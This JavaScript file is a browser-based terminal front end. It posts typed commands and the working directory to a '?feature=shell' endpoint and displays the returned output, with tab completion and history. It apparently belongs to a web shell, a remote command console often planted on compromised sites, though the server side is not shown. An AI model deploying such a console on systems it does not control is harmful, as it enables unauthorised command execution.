var CWD = null;
var commandHistory = [];
var historyPosition = 0;
var eShellCmdInput = null;
var eShellContent = null;

function _insertCommand(command) {
    eShellContent.innerHTML += "\n\n";
    eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
    eShellContent.innerHTML += escapeHtml(command);
    eShellContent.innerHTML += "\n";
    eShellContent.scrollTop = eShellContent.scrollHeight;
}

function _insertStdout(stdout) {
    eShellContent.innerHTML += escapeHtml(stdout);
    eShellContent.scrollTop = eShellContent.scrollHeight;
}

function featureShell(command) {

    _insertCommand(command);
    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function(response) {
        _insertStdout(response.stdout.join("\n"));
        updateCwd(response.cwd);
    });
}

function featureHint() {
    if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete

    function _requestCallback(data) {
        if (data.files.length <= 1) return;  // no completion

        if (data.files.length === 2) {
            if (type === 'cmd') {
                eShellCmdInput.value = data.files[0];
            } else {
                var currentValue = eShellCmdInput.value;
                eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
            }
        } else {
            _insertCommand(eShellCmdInput.value);
            _insertStdout(data.files.join("\n"));
        }
    }

    var currentCmd = eShellCmdInput.value.split(" ");
    var type = (currentCmd.length === 1) ? "cmd" : "file";
    var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];

    makeRequest(
        "?feature=hint",
        {
            filename: fileName,
            cwd: CWD,
            type: type
        },
        _requestCallback
    );

}

function genPrompt(cwd) {
    cwd = cwd || "~";
    var shortCwd = cwd;
    if (cwd.split("/").length > 3) {
        var splittedCwd = cwd.split("/");
        shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
    }
    return shell_row + ":<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
}

function updateCwd(cwd) {
    if (cwd) {
        CWD = cwd;
        _updatePrompt();
        return;
    }
    makeRequest("?feature=pwd", {}, function(response) {
        CWD = response.cwd;
        _updatePrompt();
    });

}

function escapeHtml(string) {
    return string
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;");
}

function _updatePrompt() {
    var eShellPrompt = document.getElementById("shell-prompt");
    eShellPrompt.innerHTML = genPrompt(CWD);
}

function _onShellCmdKeyDown(event) {
    switch (event.key) {
        case "Enter":
            featureShell(eShellCmdInput.value);
            insertToHistory(eShellCmdInput.value);
            eShellCmdInput.value = "";
            break;
        case "ArrowUp":
            if (historyPosition > 0) {
                historyPosition--;
                eShellCmdInput.blur();
                eShellCmdInput.focus();
                eShellCmdInput.value = commandHistory[historyPosition];
            }
            break;
        case "ArrowDown":
            if (historyPosition >= commandHistory.length) {
                break;
            }
            historyPosition++;
            if (historyPosition === commandHistory.length) {
                eShellCmdInput.value = "";
            } else {
                eShellCmdInput.blur();
                eShellCmdInput.focus();
                eShellCmdInput.value = commandHistory[historyPosition];
            }
            break;
        case 'Tab':
            event.preventDefault();
            featureHint();
            break;
    }
}

function insertToHistory(cmd) {
    commandHistory.push(cmd);
    historyPosition = commandHistory.length;
}

function makeRequest(url, params, callback) {
    function getQueryString() {
        var a = [];
        for (var key in params) {
            if (params.hasOwnProperty(key)) {
                a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
            }
        }
        return a.join("&");
    }
    var xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            try {
                var responseJson = JSON.parse(xhr.responseText);
                callback(responseJson);
            } catch (error) {
                alert("Error while parsing response: " + error);
            }
        }
    };
    xhr.send(getQueryString());
}

window.onload = function() {
    eShellCmdInput = document.getElementById("shell-cmd");
    eShellContent = document.getElementById("shell-content");
    updateCwd();
    eShellCmdInput.focus();
};